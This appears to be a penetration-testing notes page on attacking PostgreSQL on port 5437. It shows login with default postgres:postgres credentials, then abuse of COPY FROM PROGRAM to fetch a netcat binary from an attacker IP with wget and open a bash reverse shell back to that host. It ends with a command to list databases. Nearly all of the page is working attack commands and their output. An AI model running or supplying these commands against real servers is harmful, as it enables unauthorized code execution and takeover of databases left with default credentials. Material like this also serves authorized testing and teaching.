---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/penetration-testing/enumeration/service-ports/postgresql-5437
---

# PostgreSQL (5437)

## PostgreSQL Reverse shell

Since the PostgreSQL server is listening on all interfaces, we can connect to it with psql. Since credentials are required, we begin password guessing and discover that the default credentials (**postgres:postgres**) are still active.

```bash
kali@kali:~$ psql -h 10.10.10.10 -p 5437 -U postgres
Password for user postgres: [postgres]
psql (12.2 (Debian 12.2-1+b1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#
```

After switching to the default postgres database, we can download the Netcat binary to the target and use it to connect back to our attack machine.

```bash
postgres=# \c postgres;
psql (12.2 (Debian 12.2-1+b1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "postgres" as user "postgres".

postgres=# DROP TABLE IF EXISTS cmd_exec;
NOTICE:  table "cmd_exec" does not exist, skipping
DROP TABLE

postgres=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE

postgres=# COPY cmd_exec FROM PROGRAM 'wget http://192.168.234.30/nc';
COPY 0

postgres=# DELETE FROM cmd_exec;
DELETE 0

postgres=# COPY cmd_exec FROM PROGRAM 'nc -n 192.168.234.30 5437 -e /usr/bin/bash';
```

```basic
#List all the databases stored on the postgresql server using interactive client psql.
psql -h 10.10.10.10 -U postgres
\l
```
